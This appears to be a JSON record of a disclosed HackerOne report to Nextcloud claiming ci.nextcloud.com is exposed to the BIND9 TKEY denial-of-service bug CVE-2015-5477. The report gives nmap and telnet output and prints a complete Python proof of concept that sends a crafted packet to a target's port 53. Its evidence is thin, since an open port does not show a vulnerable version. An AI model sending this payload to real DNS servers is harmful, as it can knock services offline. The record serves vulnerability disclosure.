@@ -1,0 +1,114 @@
+{
+  "id": 237860,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMzc4NjA=",
+  "url": "https://hackerone.com/reports/237860",
+  "title": "ci.nextcloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-07T23:28:05.817Z",
+  "submitted_at": "2017-06-07T23:28:05.817Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xsamar",
+    "url": "/0xsamar",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9sxqhz3rs1ic1a5lc8qewnkix33m/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2015-5477"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-06-08T17:51:14.229Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-06-08T17:51:14.166Z",
+  "team_member_agreed_on_going_public_at": "2017-06-08T17:49:33.852Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello Team NextCloud,\n\nIn reference report #217381\nI've reported the DDOS attack via DNS Port at OwnCloud..\nAnd it was successfully patched.\n\nBut now same issue I got at\n\n```\nci.nextcloud.com\n```\nProof Of Concept:\nHere it is the nmap result of ci.nextcloud.com\n\nNMap Scan Results:\n```\nStarting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 04:12 PKT\nNmap scan report for ci.nextcloud.com (█████)\nHost is up (0.077s latency).\nrDNS record for █████████: ███████\nNot shown: 96 filtered ports\nPORT    STATE SERVICE    VERSION\n22/tcp  open  tcpwrapped\n53/tcp  open  tcpwrapped\n80/tcp  open  tcpwrapped\n443/tcp open  tcpwrapped\n```\nNow here it is the telnet result:\n```\n──╼ $telnet\ntelnet> open\n(to) ci.nextcloud.com 53\nTrying ███...\nConnected to ci.nextcloud.com.\nEscape character is '^]'.\n```\n\nSo this can leads to a serious DDOS attack at doc.owncloud.com using the exploit..\n\nExploit Link:\n\n```\nhttps://github.com/elceef/tkeypoc/\n```\nVulnerability Reference CVE Details:\n\n```\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477\n```\nExploit PoC:\n\nExploit Title: PoC for BIND9 TKEY DoS\n\nExploit Author: elceef\n\nSoftware Link: https://github.com/elceef/tkeypoc/\n\nVersion: ISC BIND 9\n\nTested on: multiple\n\nCVE : CVE-2015-5477\n\n```\n!/usr/bin/env python\n\nimport socket\nimport sys\n\nprint('CVE-2015-5477 BIND9 TKEY PoC')\n\nif len(sys.argv) < 2:\nprint('Usage: ' + sys.argv[0] + ' [target]')\nsys.exit(1)\n\nprint('Sending packet to ' + sys.argv[1] + ' ...')\n\npayload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(payload, (sys.argv[1], 53))\n\nprint('Done.')\n```\n\nThanks :)\n",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-07-08T17:49:33.907Z",
+  "allow_singular_disclosure_after": -278804186.6329511,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "003random",
+    "spetr0x",
+    "vj1naruto"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
